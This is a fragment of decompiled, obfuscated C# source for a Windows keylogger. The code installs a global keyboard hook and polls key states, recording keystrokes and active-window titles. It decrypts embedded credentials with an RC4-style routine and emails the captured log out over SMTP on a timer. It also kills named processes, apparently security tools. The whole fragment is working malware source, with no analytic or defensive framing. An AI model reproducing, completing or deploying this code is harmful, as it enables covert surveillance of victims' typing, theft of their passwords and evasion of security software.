        this.\u0005.Text = this.\u0005.Text + this.\u0099 + \u0003.\u0001.\u0001(537);
      }
      else if (Key == Keys.RControlKey)
      {
        this.\u0005.Text += \u0003.\u0001.\u0001(1039);
        if (Operators.CompareString(this.\u0099, this.\u0002(), false) == 0)
          return;
        this.\u0099 = this.\u0002();
        this.\u0005.Text = this.\u0005.Text + this.\u0099 + \u0003.\u0001.\u0001(537);
      }
      else if (Key == Keys.Decimal)
        this.\u0005.Text += \u0003.\u0001.\u0001(921);
      else if (Key == Keys.Delete)
        this.\u0005.Text += \u0003.\u0001.\u0001(1034);
      else if (Key == Keys.Divide)
        this.\u0005.Text += \u0003.\u0001.\u0001(991);
      else if (Key == Keys.Down)
        this.\u0005.Text += \u0003.\u0001.\u0001(1048);
      else if (Key == Keys.End)
        this.\u0005.Text += \u0003.\u0001.\u0001(1057);
      else if (Key == Keys.Return)
      {
        this.\u0005.Text += \u0003.\u0001.\u0001(1066);
        if (Operators.CompareString(this.\u0099, this.\u0002(), false) == 0)
          return;
        this.\u0099 = this.\u0002();
        this.\u0005.Text = this.\u0005.Text + \u0003.\u0001.\u0001(537) + this.\u0099 + \u0003.\u0001.\u0001(537);
      }
      else if (Key == Keys.Escape)
      {
        this.\u0005.Text += \u0003.\u0001.\u0001(1071);
        if (Operators.CompareString(this.\u0099, this.\u0002(), false) == 0)
          return;
        this.\u0099 = this.\u0002();
        this.\u0005.Text = this.\u0005.Text + \u0003.\u0001.\u0001(537) + this.\u0099 + \u0003.\u0001.\u0001(537);
      }
      else if (Key == Keys.Home)
        this.\u0005.Text += \u0003.\u0001.\u0001(1080);
      else if (Key == Keys.Insert)
        this.\u0005.Text += \u0003.\u0001.\u0001(1089);
      else if (Key == Keys.Left)
        this.\u0005.Text += \u0003.\u0001.\u0001(1102);
      else if (Key == Keys.Multiply)
        this.\u0005.Text += \u0003.\u0001.\u0001(886);
      else if (Key == Keys.Next)
        this.\u0005.Text += \u0003.\u0001.\u0001(1111);
      else if (Key == Keys.Prior)
        this.\u0005.Text += \u0003.\u0001.\u0001(1124);
      else if (Key == Keys.Snapshot)
        this.\u0005.Text += \u0003.\u0001.\u0001(1133);
      else if (Key == Keys.Return)
        this.\u0005.Text += \u0003.\u0001.\u0001(1066);
      else if (Key == Keys.Scroll)
        this.\u0005.Text += \u0003.\u0001.\u0001(1154);
      else if (Key == Keys.Up)
        this.\u0005.Text += \u0003.\u0001.\u0001(1167);
      else if (Key == Keys.Right)
        this.\u0005.Text += \u0003.\u0001.\u0001(1176);
      else if (Key == Keys.Pause)
        this.\u0005.Text += \u0003.\u0001.\u0001(1185);
      else if (Key == Keys.F1)
        this.\u0005.Text += \u0003.\u0001.\u0001(1198);
      else if (Key == Keys.F2)
        this.\u0005.Text += \u0003.\u0001.\u0001(1207);
      else if (Key == Keys.F3)
        this.\u0005.Text += \u0003.\u0001.\u0001(1216);
      else if (Key == Keys.F4)
      {
        this.\u0005.Text += \u0003.\u0001.\u0001(1225);
        if (Operators.CompareString(this.\u0099, this.\u0002(), false) == 0)
          return;
        this.\u0099 = this.\u0002();
        this.\u0005.Text = this.\u0005.Text + \u0003.\u0001.\u0001(537) + this.\u0099 + \u0003.\u0001.\u0001(537);
      }
      else if (Key == Keys.F5)
        this.\u0005.Text += \u0003.\u0001.\u0001(1234);
      else if (Key == Keys.F6)
        this.\u0005.Text += \u0003.\u0001.\u0001(1243);
      else if (Key == Keys.F7)
        this.\u0005.Text += \u0003.\u0001.\u0001(1252);
      else if (Key == Keys.F8)
        this.\u0005.Text += \u0003.\u0001.\u0001(1261);
      else if (Key == Keys.F9)
        this.\u0005.Text += \u0003.\u0001.\u0001(1270);
      else if (Key == Keys.F10)
        this.\u0005.Text += \u0003.\u0001.\u0001(1279);
      else if (Key == Keys.F11)
        this.\u0005.Text += \u0003.\u0001.\u0001(1288);
      else if (Key == Keys.F12)
        this.\u0005.Text += \u0003.\u0001.\u0001(1297);
      else if (Key == Keys.F13)
        this.\u0005.Text += \u0003.\u0001.\u0001(1306);
      else if (Key == Keys.F14)
        this.\u0005.Text += \u0003.\u0001.\u0001(1315);
      else if (Key == Keys.F15)
        this.\u0005.Text += \u0003.\u0001.\u0001(1324);
      else if (Key == Keys.NumPad0)
        this.\u0005.Text += \u0003.\u0001.\u0001(811);
      else if (Key == Keys.NumPad1)
        this.\u0005.Text += \u0003.\u0001.\u0001(821);
      else if (Key == Keys.NumPad2)
        this.\u0005.Text += \u0003.\u0001.\u0001(831);
      else if (Key == Keys.NumPad3)
        this.\u0005.Text += \u0003.\u0001.\u0001(841);
      else if (Key == Keys.NumPad4)
        this.\u0005.Text += \u0003.\u0001.\u0001(851);
      else if (Key == Keys.NumPad5)
        this.\u0005.Text += \u0003.\u0001.\u0001(861);
      else if (Key == Keys.NumPad6)
        this.\u0005.Text += \u0003.\u0001.\u0001(871);
      else if (Key == Keys.NumPad7)
        this.\u0005.Text += \u0003.\u0001.\u0001(881);
      else if (Key == Keys.NumPad8)
        this.\u0005.Text += \u0003.\u0001.\u0001(891);
      else if (Key == Keys.NumPad9)
      {
        this.\u0005.Text += \u0003.\u0001.\u0001(896);
      }
      else
      {
        if (Key != Keys.NumLock)
          return;
        this.\u0005.Text += \u0003.\u0001.\u0001(1333);
      }
    }

    [DllImport("user32", EntryPoint = "GetAsyncKeyState", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0003(long vkey);

    private void \u0003(object sender, EventArgs e)
    {
      if (!\u0002.\u0003.Computer.Network.IsAvailable)
        return;
      try
      {
        this.\u000F.Text = \u0003.\u0001.\u0002(this.\u0006.Text, \u0003.\u0001.\u0001(1346));
        try
        {
          this.\u0010.Text = \u0003.\u0001.\u0002(this.\u0007.Text, \u0003.\u0001.\u0001(1355));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        new SmtpClient()
        {
          Host = \u0003.\u0001.\u0001(1385),
          Port = Conversions.ToInteger(\u0003.\u0001.\u0001(1406)),
          Credentials = ((ICredentialsByHost) new NetworkCredential(this.\u000F.Text, this.\u0010.Text)),
          EnableSsl = true
        }.Send(new MailMessage()
        {
          From = new MailAddress(this.\u000F.Text),
          To = {
            this.\u000F.Text
          },
          Body = this.\u0005.Text,
          Subject = \u0003.\u0001.\u0001(1364)
        });
        this.\u0005.Clear();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string \u0002(string message, string esendx666word)
    {
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
      int length = esendx666word.Length;
      int location1 = 0;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = esendx666word.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = Strings.Asc(String);
        numArray1[location1] = location1;
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int index3 = 0;
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
        int num = numArray1[location2];
        numArray1[location2] = numArray1[index3];
        numArray1[index3] = num;
        Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
      }
      location1 = 1;
      while (location1 <= message.Length)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + numArray1[index1]) % 256;
        int num1 = numArray1[index1];
        numArray1[index1] = numArray1[index2];
        numArray1[index2] = num1;
        int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
        int CharCode = Strings.Asc(message.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
        stringBuilder.Append(Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }

    private void \u0004(object sender, EventArgs e)
    {
      if (\u0003.\u0001.\u0003(2L) == -32767)
        goto label_7;
label_4:
      if (\u0003.\u0001.\u0003(1L) != -32767)
        return;
      this.\u0005.Text += \u0003.\u0001.\u0001(1429);
      if (Operators.CompareString(this.\u0099, this.\u0002(), false) == 0)
        return;
      this.\u0099 = this.\u0002();
      this.\u0005.Text = this.\u0005.Text + \u0003.\u0001.\u0001(537) + this.\u0099 + \u0003.\u0001.\u0001(1420);
      return;
label_7:
      this.\u0005.Text += \u0003.\u0001.\u0001(1411);
      if (Operators.CompareString(this.\u0099, this.\u0002(), false) != 0)
      {
        this.\u0099 = this.\u0002();
        this.\u0005.Text = this.\u0005.Text + \u0003.\u0001.\u0001(537) + this.\u0099 + \u0003.\u0001.\u0001(1420);
        goto label_4;
      }
      else
        goto label_4;
    }

    private void \u0005(object sender, EventArgs e)
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(this.\u008D, \u0003.\u0001.\u0001(325), false) == 0 && Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase(\u0003.\u0001.\u0001(1438)), false) == 0)
          processes[index].Kill();
        if (Operators.CompareString(this.\u008E, \u0003.\u0001.\u0001(325), false) == 0 && Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase(\u0003.\u0001.\u0001(1447)), false) == 0)
          processes[index].Kill();
        if (Operators.CompareString(this.\u008F, \u0003.\u0001.\u0001(325), false) == 0 && Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase(\u0003.\u0001.\u0001(1460)), false) == 0)
          processes[index].Kill();
        if (Operators.CompareString(this.\u0090, \u0003.\u0001.\u0001(325), false) == 0 && Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase(\u0003.\u0001.\u0001(1469)), false) == 0)
          processes[index].Kill();
        if (Operators.CompareString(this.\u0094, \u0003.\u0001.\u0001(325), false) == 0 && Operators.CompareString(Strings.LCase(processes[index].ProcessName), Strings.LCase(\u0003.\u0001.\u0001(1482)), false) == 0)
          processes[index].Kill();
        if (Operators.CompareString(this.\u0097, \u0003.\u0001.\u0001(325), false) == 0 && Operators.CompareString(Strings.LCase(processes[index].ProcessName), Strings.LCase(\u0003.\u0001.\u0001(1499)), false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    static \u0001() => \u0001.\u0002.\u0002();

    internal class \u0001
    {
      private const int \u0001 = 0;
      private const int \u0002 = 13;
      private const int \u0003 = 256;
      private const int \u0004 = 257;
      private const int \u0005 = 260;
      private const int \u0006 = 261;
      private static int \u000E;
      private static \u0003.\u0001.\u0001.\u0002 \u000F;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int \u0002(
        int idHook,
        \u0003.\u0001.\u0001.\u0002 lpfn,
        int hmod,
        int dwThreadId);

      [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int \u0002(
        int hHook,
        int nCode,
        int wParam,
        \u0003.\u0001.\u0001.\u0001 lParam);

      [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int \u0002(int hHook);

      public static event \u0003.\u0001.\u0001.\u0003 KeyDown;

      public static event \u0003.\u0001.\u0001.\u0004 KeyUp;

      public \u0001()
      {
        \u0003.\u0001.\u0001.\u000F = new \u0003.\u0001.\u0001.\u0002(\u0003.\u0001.\u0001.\u0002);
        \u0003.\u0001.\u0001.\u000E = \u0003.\u0001.\u0001.\u0002(13, \u0003.\u0001.\u0001.\u000F, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
      }

      private static int \u0002(int nCode, int wParam, ref \u0003.\u0001.\u0001.\u0001 lParam)
      {
        if (nCode == 0)
          goto label_5;
label_4:
        return \u0003.\u0001.\u0001.\u0002(\u0003.\u0001.\u0001.\u000E, nCode, wParam, lParam);
label_5:
        switch (wParam)
        {
          case 256:
          case 260:
            \u0003.\u0001.\u0001.\u0003 obj1 = \u0003.\u0001.\u0001.\u0007;
            if (obj1 != null)
            {
              obj1((Keys) lParam.\u0001);
              goto label_4;
            }
            else
              goto label_4;
          case 257:
          case 261:
            \u0003.\u0001.\u0001.\u0004 obj2 = \u0003.\u0001.\u0001.\u0008;
            if (obj2 != null)
            {
              obj2((Keys) lParam.\u0001);
              goto label_4;
            }
            else
              goto label_4;
          default:
            goto label_4;
        }
      }

      ~\u0001()
      {
        \u0003.\u0001.\u0001.\u0002(\u0003.\u0001.\u0001.\u000E);
        // ISSUE: explicit finalizer call
        base.Finalize();
      }

      private struct \u0001
      {
        public int \u0001;
        public int \u0002;
        public int \u0003;
        public int \u0004;
        public int \u0005;
      }

      private delegate int \u0002(int nCode, int wParam, ref \u0003.\u0001.\u0001.\u0001 lParam);

      internal delegate void \u0003(Keys Key);

      internal delegate void \u0004(Keys Key);
    }
  }
}
